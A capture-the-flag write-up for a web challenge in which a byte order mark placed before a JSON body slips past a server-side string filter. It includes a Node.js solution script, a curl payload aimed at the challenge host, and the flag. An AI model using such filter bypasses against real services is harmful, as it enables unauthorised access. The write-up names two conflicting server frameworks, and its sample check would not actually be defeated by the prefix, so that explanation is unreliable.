# CIA CTF Challenge Writeup

## Challenge Information
- **Name:** CIA
- **Points:** 500
- **Category:** Web
- **Description:** CIA's new agent developed this website with js and html.
- **Flag Format:** CS{someth1ng}
- **Author:** badhacker0x01
- **URL:** http://49.213.52.6:6969/

## Initial Analysis

### Website Structure
The website contains a simple HTML page with:
- A heading: "CIA's Website No permissions for Malicious acitvity"
- A button with id "button" that says "Dont Click me!"
- JavaScript code that makes a POST request when the button is clicked

### Source Code Analysis
```html
<!DOCTYPE html>
<html>
<body>
  <div>
    <h1>CIA's Website No permissions for Malicious acitvity</h1>
    <button id="button">
      Dont Click me!
    </button>
  </div>
  <script>
    button.addEventListener("click", async () => {
      const flag = await fetch("/", {
        method: "POST",
        body: JSON.stringify({ flagDaw: true }),
      }).then((r) => r.text());

      alert(flag);
    });
  </script>
</body>
</html>
```

## Investigation

### Initial Attempts
When making a POST request with `{"flagDaw": true}`, the server responds with:
```
Not Allowd to Click It
```

### Key Discoveries

1. **Case-Sensitive Validation:**
   - `{"flagDaw": true}` → `Not Allowd to Click It` (blocked, 200 status)
   - `{"flagdaw": true}`, `{"FlagDaw": true}`, `{"FLAGDAW": true}` → `Ehh asche flag nite!! joggota hoise??` (Bengali message, 400 status)

2. **Server Technology:**
   - Uses **Express.js** (Node.js framework) - confirmed by `x-powered-by: Express` header
   - Uses **Fastify** error messages (FST_ERR_CTP_INVALID_MEDIA_TYPE)
   - Requires `application/json` or `text/plain;charset=UTF-8` Content-Type

3. **Request Headers:**
   - When using `fetch()` with `JSON.stringify()` without explicitly setting Content-Type, browsers send `Content-Type: text/plain;charset=UTF-8`
   - The server validates the exact structure `{"flagDaw": true}` at the top level

### The Solution: BOM (Byte Order Mark) Bypass

The server was checking the raw request body string for the exact pattern `{"flagDaw":true}`. By prepending a **BOM (Byte Order Mark)** character (`\uFEFF` or `\xEF\xBB\xBF`) to the JSON string, the string-based validation check failed, allowing the request to pass through.

**Working Payload:**
```javascript
'\uFEFF' + JSON.stringify({ flagDaw: true })
// Or in bytes: \xEF\xBB\xBF{"flagDaw":true}
```

**Flag:**
```
CS{a711525257ac064525eb620f4e224e8e}
```

## Solution Script

```javascript
const http = require('http');

const url = new URL('http://49.213.52.6:6969/');
const postData = '\uFEFF' + JSON.stringify({ flagDaw: true });

const options = {
  hostname: url.hostname,
  port: url.port,
  path: url.pathname,
  method: 'POST',
  headers: {
    'Content-Type': 'text/plain;charset=UTF-8',
    'Content-Length': Buffer.byteLength(postData),
    'Referer': 'http://49.213.52.6:6969/',
    'Origin': 'http://49.213.52.6:6969/',
    'Accept': '*/*'
  }
};

const req = http.request(options, (res) => {
  let data = '';
  res.on('data', (chunk) => { data += chunk; });
  res.on('end', () => {
    console.log('Flag:', data);
  });
});

req.write(postData);
req.end();
```

## Alternative Solution (curl)

```bash
curl -X POST http://49.213.52.6:6969/ \
  -H "Content-Type: text/plain;charset=UTF-8" \
  -H "Referer: http://49.213.52.6:6969/" \
  -d $'\xEF\xBB\xBF{"flagDaw":true}'
```

## Why This Works

The server was likely using a string-based validation check like:
```javascript
if (req.body.includes('"flagDaw":true')) {
  return "Not Allowd to Click It";
}
```

By prepending the BOM character, the string no longer matches the exact pattern, bypassing the validation while still being valid JSON that Express.js can parse correctly.

## Lessons Learned

1. **String-based validation can be bypassed** with encoding tricks
2. **BOM characters** can be used to bypass string matching
3. **Express.js body-parser** accepts BOM-prefixed JSON
4. Always test different encoding and formatting variations when dealing with validation bypasses

---

**Flag:** `CS{a711525257ac064525eb620f4e224e8e}`

